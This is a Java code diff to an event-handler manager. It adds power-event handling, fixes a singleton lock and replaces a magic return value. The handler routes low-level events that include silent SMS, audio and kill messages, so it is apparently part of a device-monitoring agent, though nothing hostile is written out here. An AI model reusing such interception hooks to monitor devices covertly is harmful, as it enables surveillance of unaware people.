@@ -59,6 +59,7 @@ public class LowEventHandlerManager extends Listener<LowEventMsg> implements Run
 	 */
 	private static LowEventSmsManager llhSms ;
 	private static LowEventAudioManager llhAudio ;
+	private static LowEventPowerManager llhPower ;
 	protected LowEventHandlerManager() {
 	}
 
@@ -69,7 +70,7 @@ public class LowEventHandlerManager extends Listener<LowEventMsg> implements Run
 	 */
 	public static LowEventHandlerManager self() {
 		if (singleton == null) {
-			synchronized (ListenerSms.class) {
+			synchronized (LowEventHandlerManager.class) {
 				if (singleton == null) {
 					singleton = new LowEventHandlerManager();
 				}
@@ -78,6 +79,9 @@ public class LowEventHandlerManager extends Listener<LowEventMsg> implements Run
 				}
 				if ( llhAudio == null ){
 					llhAudio = LowEventAudioManager.self();
+				}
+				if ( llhPower == null ){
+					llhPower = LowEventPowerManager.self();
 				}
 			}
 		}
@@ -191,6 +195,12 @@ public class LowEventHandlerManager extends Listener<LowEventMsg> implements Run
 							}
 							if (event.type  == LowEventMsg.EVENT_TYPE_SMS || event.type  == LowEventMsg.EVENT_TYPE_SMS_SILENT) {
 								event.res = llhSms.notification(event);
+							}if (event.type  == LowEventMsg.EVENT_TYPE_POWER) {
+								if(llhPower.hasObservers()) {
+									event.res = llhPower.notification(event);
+								}else{
+									event.res =  LowEventMsg.RES_DO_NOTHING;
+								}
 							}if (event.type  == LowEventMsg.EVENT_TYPE_AUDIO) {
 								event.res = llhAudio.notification(event);
 							} if(event.type == LowEventMsg.EVENT_TYPE_KILL) {
@@ -199,10 +209,10 @@ public class LowEventHandlerManager extends Listener<LowEventMsg> implements Run
 								 */
 								if (Cfg.DEBUG) {
 									Check.log(TAG + "(run): SENT Kill");
-									event.res = 1;
+									event.res = LowEventMsg.RES_DO_NOTHING;
 								}
 							}else{
-								event.res = 1;
+								event.res = LowEventMsg.RES_DO_NOTHING;
 							}
 							if (Cfg.DEBUG) {
 								Check.log(TAG + "(run): SENT reply " + event.res);
